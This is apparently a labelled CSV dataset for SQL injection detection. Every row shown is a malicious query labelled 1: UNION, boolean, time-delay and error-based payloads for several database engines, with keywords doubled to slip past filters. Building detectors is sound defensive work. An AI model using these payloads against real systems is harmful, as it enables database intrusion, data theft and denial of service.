Query,Label
"1""  )   wherwheree 2837  =  2837 anandd   (  3020  =  3020  )  *6703--",1
1'  )   oorr   (  seselectlect * frfromom   (  seselectlect  (  sleep  (  5   )    )     )  ydpu  )   anandd   (  'zaes'  =  'zaes,1
"-4400 union all selselectect 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",1
"1'+  (  seleselectct jidy whewherere 2989  =  2989 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'   )    )    aandnd 6510  =    (  selecselectt count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   aandnd    (    (   'tqpj'  =  'tqpj",1
"1%'   )    )     )   oorr 2367  =    (  selselectect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1  )   as ewnv whewherere 3393  =  3393 anandd 2716  =    (  seselectlect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9751""   )    )     )   oorr 5929  =  3884--",1
"1'+  (  seleselectct 'bsva' wherwheree 4378  =  4378 oorr 7552  =    (  seleselectct count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",1
1 aandnd 6969  =    (  sselectelect 6969 ffromrom pg_sleep  (  5   )    ) ,1
"1""  )   whewherere 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"1%'  )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seselectlect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    aandnd   (  '%'  =  '",1
"1"" anandd 5556  =    (  sselectelect count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"-1628"" union all selecselectt 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1
"1""  )   as ckoi wwherehere 4674  =  4674 union all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"-8166""   )    )     )   oorr 5903  =    (  'qqpjq'||  (  selselectect case 5903 when 5903 then 1 else 0 end frfromom rdb$datadatabasebase  )  ||'qzvzq'  )   aandnd    (    (     (  ""lcqb""  =  ""lcqb",1
"1' iinn boolean mode  )   oorr 7552  =    (  seselectlect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1
"-8419  )   wherwheree 8692  =  8692 union all seleselectct 8692,8692,8692--",1
1  )   as nmlm wwherehere 9872  =  9872,1
"1""  )   union all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
-3161'  )   oorr 8501  =  1796,1
"1'+  (  selecselectt 'jhce' whewherere 1117  =  1117 aandnd 5556  =    (  selecselectt count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
"1""   )    )    oorr 5286  =    (  seleselectct count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   anandd    (    (   ""lano""  =  ""lano",1
1' aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selselectect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd 'psdl' lilikeke 'psdl,1
"1""   )    )     )   oorr   (  seselectlect 9173 frfromom  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd    (    (     (  ""oyxk""  =  ""oyxk",1
"seleselectct llikeike  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd   (  7711  =  7711",1
"-6600'  )   union all sselectelect 5566,5566#",1
1'  )   aandnd   (  seleselectct * frofromm   (  seleselectct  (  sleep  (  5   )    )     )  fzno  ) ,1
"-9721' oorr elt  (  9511  =  9238,9238  )  ",1
"1'  )   aandnd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
"1%"" oorr   (  seselectlect * ffromrom   (  seselectlect  (  sleep  (  5   )    )     )  sddo  )  #",1
"seleselectct pg_sleep  (  5  )   aandnd ""ilyw"" liklikee ""ilyw",1
-2820'   )    )    oorr 6679  =  8848--,1
"-6453""   )    )    as hehs wherwheree 9363  =  9363 union all selecselectt 9363,9363,9363,9363,9363,9363,9363,9363,9363#",1
"1"" anandd 8407  =    (  selselectect count  (  *  )   frofromm generate_series  (  1,5000000   )    )    anandd ""zwov""  =  ""zwov",1
1'   )    )    as oyad wwherehere 7161  =  7161 anandd 6240  =    (  'qqpjq'||  (  seleselectct case 6240 when 6240 then 1 else 0 end frofromm rdb$ddatabaseatabase  )  ||'qzvzq'  )  --,1
"1   )    )    as kgit whewherere 1919  =  1919 aandnd char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,nnullull  )  --",1
1   )    )    as mcyh wherwheree 1001  =  1001,1
"1' oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    anandd 'usnh' llikeike 'usnh",1
"1%""   )    )    aandnd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   aandnd    (    (   ""%""  =  """,1
"-5207  )   wwherehere 6987  =  6987 oorr 1570  =  convert  (  iinnt,  (  sselectelect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sselectelect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-1287""  )   as bbzg wherwheree 1475  =  1475 union all seselectlect 1475,1475,1475,1475,1475,1475,1475,1475,1475#",1
"seleselectct lilikeke  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )    anandd 'fpaf'  =  'fpaf",1
"1""   )    )     )   aandnd sleep  (  5  )   aandnd    (    (     (  ""bvgg""  =  ""bvgg",1
1 anandd 7533  =  7533-- spzi,1
"-1644%' oorr make_sesett  (  9354  =  9354,7185  )   aandnd '%'  =  '",1
"1 wherwheree 4331  =  4331 union all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll,nunullll#",1
1  )   as qoorrt wherwheree 1554  =  1554,1
"1""   )    )     )   aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
1  )   wwherehere 5418  =  5418 union all selselectect nulnulll--,1
1'   )    )     )   aandnd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd    (    (     (  'eocx'  =  'eocx,1
"1"" whewherere 4294  =  4294 aandnd make_ssetet  (  2543  =  7988,7988  )  --",1
1'   )    )    aandnd 4595  =  4595#,1
-6680'  )   oorr 5483  =  3031 anandd   (  'zxes'  =  'zxes,1
"1',  (  selecselectt   (  case when   (  2073  =  5314  )   then 1 else 1/  (  selecselectt 0  )   end   )    )   ",1
"1' aandnd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1""   )    )    oorr 7552  =    (  selecselectt count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   anandd    (    (   ""sjiz"" lilikeke ""sjiz",1
1'   )    )     )   anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (     (  'pneh' lilikeke 'pneh,1
"1  )   whwhereere 4768  =  4768 union all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull#",1
1'  )   wherwheree 5286  =  5286,1
1'   )    )    oorr   (  seleselectct * ffromrom   (  seleselectct  (  sleep  (  5   )    )     )  ydpu  )   anandd    (    (   'ytxg'  =  'ytxg,1
"1%""   )    )     )   anandd 9254  =    (  selecselectt count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%'  )   oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   anandd   (  '%'  =  '",1
"1%"" anandd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   anandd ""%""  =  """,1
1'+  (  seselectlect hvsb whewherere 3666  =  3666,1
if  (  2697  =  2008  )   selselectect 2697 else drodropp function jcoo--,1
"1 whewherere 6119  =  6119 oorr 2367  =    (  seleselectct count  (  *  )   frfromom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
-8710 oorr 9323  =  9323#,1
1' aandnd 6969  =    (  seleselectct 6969 ffromrom pg_sleep  (  5   )    )    aandnd 'zoiinn'  =  'zoiinn,1
"-7996""   )    )    oorr 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (   ""iuzv"" llikeike ""iuzv",1
"1""   )    )    oorr   (  sselectelect * frfromom   (  sselectelect  (  sleep  (  5   )    )     )  ydpu  )   aandnd    (    (   ""knbx""  =  ""knbx",1
"1'   )    )    as fjbe wwherehere 4662  =  4662 oorr 2367  =    (  seleselectct count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-5732'  )   union all seselectlect 7614,7614,7614,7614--",1
"1"" union all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll--",1
-4157'  )   oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seleselectct   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd   (  'rdhm'  =  'rdhm,1
"-7412""  )   as qngt whwhereere 2041  =  2041 union all sselectelect 2041--",1
"-8673""  )   oorr make_sesett  (  9354  =  9354,7185  )   aandnd   (  ""edap"" liklikee ""edap",1
"1"" oorrdeoorrderr bbyy 1--",1
"-4721'  )   oorr elt  (  4378  =  5165,5165  )   aandnd   (  'fufn'  =  'fufn",1
"1   )    )    anandd exp  (  ~  (  seleselectct * frofromm   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd    (    (   2748  =  2748",1
"1""  )   whewherere 9648  =  9648 aandnd elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"1""   )    )     )   oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nulnulll  )   anandd    (    (     (  ""fpwu"" llikeike ""fpwu",1
"-5294%""  )   oorr 4144  =    (  seselectlect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual  )   aandnd   (  ""%""  =  """,1
"1  )   whewherere 2741  =  2741 anandd 6414  =    (  sselectelect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1,  (  seselectlect * frofromm generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limlimitit 1  )  ",1
"-3620'||  (  selecselectt 'kmei' whwhereere 8533  =  8533 union all selecselectt 8533,8533,8533,8533--",1
"1' oorr exp  (  ~  (  selselectect * frofromm   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd 'ibdj'  =  'ibdj",1
-9327'  )   oorr 3038  =  3038,1
"-9829'   )    )     )   oorr 1 group bbyy concat  (  0x7171706a71,  (  seleselectct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )    haviinng miinn  (  0  )  #",1
begiinn user_lock.sleep  (  5  ) ,1
"1""   )    )    oorr 5356  =    (  seleselectct count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'   )    )     )   oorr exp  (  ~  (  seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd    (    (     (  'toft'  =  'toft",1
"1' wwherehere 1602  =  1602 oorr   (  seleselectct 2*  (  if   (    (   seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
1  )   whwhereere 9167  =  9167,1
"1""  )   as dien wwherehere 4022  =  4022",1
1   )    )    aandnd 8594  =    (  seselectlect 8594 frfromom pg_sleep  (  5   )    )   --,1
"-1083%""   )    )     )   oorr elt  (  1032  =  1032,3623  )   aandnd    (    (     (  ""%""  =  """,1
"call regexp_substriinng  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,nulnulll  )   aandnd ""dwbh"" llikeike ""dwbh",1
"-9197%""   )    )     )   union all selselectect 1040,1040,1040,1040,1040,1040,1040,1040,1040#",1
"1%""  )   anandd 4241  =  convert  (  iinnt,  (  selecselectt char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecselectt   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   anandd   (  ""%""  =  """,1
1'||  (  selselectect 'tezo' ffromrom dual whewherere 4436  =  4436,1
"-8684 union all seleselectct 9519,9519,9519,9519--",1
1'   )    )    as zari whwhereere 6847  =  6847,1
"-9588'   )    )    union all seleselectct 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",1
"1' oorr 6979  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )   --",1
"1""  )   as rbgl whewherere 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
"-3781  )   union all seselectlect 3916,3916,3916--",1
"selselectect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabtableles as t3 anandd   (  ""seci""  =  ""seci",1
"-5849  )   union all selselectect 6168,6168,6168,6168,6168,6168,6168,6168#",1
"1""   )    )    union all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1'  )   as ildf wherwheree 5545  =  5545 union all selecselectt nunullll,nunullll,nunullll,nunullll#",1
"-3955 whwhereere 7276  =  7276 union all selecselectt 7276,7276,7276,7276,7276,7276,7276,7276,7276--",1
"1""  )   union all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll#",1
"-3415 oorr 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- jove",1
"1'  )   as jwvp whwhereere 5231  =  5231 anandd 8189  =    (  sselectelect count  (  *  )   frofromm sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3  )  --",1
"1""  )   as ubva wwherehere 6369  =  6369 anandd 8514  =    (  selselectect count  (  *  )   ffromrom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )  --",1
1  )   as nwfz wherwheree 7365  =  7365 anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1""   )    )     )   anandd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1%'  )   aandnd make_sesett  (  1458  =  3902,3902  )   aandnd   (  '%'  =  '",1
"-2289""  )   oorr 8624  =  6279 anandd   (  ""iissed""  =  ""iissed",1
"1%'   )    )     )   oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1%'  )   anandd 6510  =    (  sselectelect count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   anandd   (  '%'  =  '",1
"-6412   )    )    as cnfs wwherehere 6557  =  6557 union all seselectlect 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1
"1%'   )    )    anandd make_sesett  (  8403  =  8403,8899  )   anandd    (    (   '%'  =  '",1
"1%""   )    )     )  ",1
"1'+  (  selselectect 'ndpx' wherwheree 4061  =  4061 oorr 7417  =    (  selselectect count  (  *  )   ffromrom sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3  )  --",1
"1'   )    )     )   oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1'  )   anandd 8594  =    (  seleselectct 8594 frofromm pg_sleep  (  5   )    )   --,1
"1"" whewherere 5552  =  5552 oorr 5356  =    (  seselectlect count  (  *  )   frfromom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'+  (  seselectlect 'wpnm' whwhereere 8223  =  8223 aandnd 6240  =    (  'qqpjq'||  (  seselectlect case 6240 when 6240 then 1 else 0 end frfromom rdb$ddatabaseatabase  )  ||'qzvzq'   )    )   +',1
"1'   )    )     (  selecselectt   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   ffromrom   (  vavalueslues  (  0   )    )     )   anandd    (    (   'qeet'  =  'qeet",1
"-5826""   )    )    union all seselectlect 7192,7192#",1
"-9959""  )   wherwheree 7073  =  7073 union all selecselectt 7073,7073,7073,7073,7073,7073,7073,7073#",1
"-6381%""   )    )     )   union all seselectlect 1503,1503,1503,1503#",1
1' anandd 7533  =  7533 anandd 'clqy' liklikee 'clqy,1
"1'+  (  seleselectct 'rguk' whewherere 6019  =  6019 union all seleselectct nunullll,nunullll,nunullll,nunullll,nunullll--",1
"1%""  )   oorr 5286  =    (  sselectelect count  (  *  )   ffromrom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   aandnd   (  ""%""  =  """,1
-5286' oorr 6783  =  1233,1
"1%""  )   aandnd row  (  6237,7469  )  >  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom   (  seleselectct 5192 union seleselectct 3785 union seleselectct 3931 union seleselectct 7158  )  a group bbyy x  )   aandnd   (  ""%""  =  """,1
"1'  )   aandnd   (  selselectect 2*  (  if   (    (   selselectect * ffromrom   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aandnd   (  'xonc'  =  'xonc",1
1 waitfoorr delay '0:0:5'# opyp,1
"1'  )   anandd 8148  =  liklikee  (  'abcdefg',upper  (  hex  (  rananddomblob  (  500000000/2   )    )      )    )   --",1
1'||  (  selselectect 'xugb' frofromm dual wwherehere 6772  =  6772,1
"1"" union all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
-8163   )    )    as cvai whewherere 2360  =  2360 oorr 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sselectelect   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
1  )   wherwheree 1079  =  1079,1
"1"" aandnd   (  7424  =  2381  )  *2381 aandnd ""dvju""  =  ""dvju",1
1'+  (  sselectelect 'vtyw' wwherehere 7950  =  7950 oorroorrderder bbyy 1--,1
"1""   )    )    as paep whewherere 8947  =  8947 anandd   (  seselectlect 9067 ffromrom  (  seselectlect count  (  *  )  ,concat  (  0x7171706a71,  (  seselectlect   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )  --",1
1 anandd 3754  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   ffromrom dual  )  # sipo,1
"1   (  seleselectct   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nulnulll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frofromm iinnfoorrmation_schema.system_users  )  # ujdg",1
"1""   )    )    aandnd 3754  =    (  selselectect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frfromom dual  )   aandnd    (    (   ""qnqb"" liklikee ""qnqb",1
1'+  (  seleselectct 'jmdl' wwherehere 7827  =  7827,1
1  )   as qwsa wwherehere 2874  =  2874,1
1'   )    )    aandnd 7230  =  2517,1
1'  )   whwhereere 8291  =  8291,1
"seselectlect liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd ""ejmj"" liklikee ""ejmj",1
1  )   as ryks whwhereere 1196  =  1196,1
"seleselectct count  (  *  )   frofromm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1
1%'   )    )    anandd 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   anandd    (    (   '%'  =  ',1
"1%""   )    )     )   aandnd sleep  (  5  )   aandnd    (    (     (  ""%""  =  """,1
"1""  )   whwhereere 1416  =  1416 union all seselectlect nulnulll,nulnulll,nulnulll#",1
"1'   )    )    as agdn wwherehere 8442  =  8442 anandd 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
1  )   whwhereere 5025  =  5025,1
"1%""  )   union all seselectlect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll#",1
"1   )    )     )   union all seleselectct nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"-2247'  )   union all seleselectct 1202,1202,1202,1202,1202#",1
"1'  )   anandd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1"" aandnd 6637  =  2321",1
"seselectlect benchmark  (  5000000,md5  (  0x4c4d6142   )    )    anandd    (    (     (  'lqwz'  =  'lqwz",1
"1%'   )    )    aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-1550%""   )    )     )   oorrdoorrderer bbyy 1--",1
"1%'   )    )    anandd elt  (  1210  =  1210,sleep  (  5   )    )    anandd    (    (   '%'  =  '",1
"1"" whewherere 7015  =  7015",1
"1%'   )    )     )   aandnd 6414  =    (  seleselectct count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aandnd    (    (     (  '%'  =  '",1
-6722'  )   oorrdoorrderer bbyy 1#,1
